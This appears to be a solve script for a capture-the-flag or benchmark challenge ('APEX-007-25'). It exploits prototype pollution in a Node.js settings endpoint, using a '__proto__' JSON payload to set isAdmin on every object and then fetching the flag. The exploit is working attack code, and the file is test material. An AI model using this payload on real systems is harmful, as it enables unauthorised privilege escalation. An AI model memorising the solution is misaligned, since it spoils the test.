#!/usr/bin/env bash
# APEX-007-25 — "Prototype Pollution to RCE" (tags: prototype_pollution, nodejs)
#
# `/api/settings` merges the JSON it is given into a stored object with a
# recursive merge that walks every key, `__proto__` included. Writing through
# that key does not add a property to the settings; it adds one to
# `Object.prototype`, which every object in the process inherits. `/api/export/flag`
# then asks an object it built itself whether `isAdmin` is set, and now every
# object says yes.
#
# `--set json.__proto__={"isAdmin":true}` — a `--set` value that parses as JSON
# is used as JSON, so this is the nested object the merge has to walk into
# rather than a string that it would copy verbatim.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex007-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST \
    --set path=/api/settings \
    --set header.Content-Type=application/json \
    --set 'json.__proto__={"isAdmin":true}' >/dev/null
send "$SESSION" req_0 --create --set path=/api/export/flag | flag
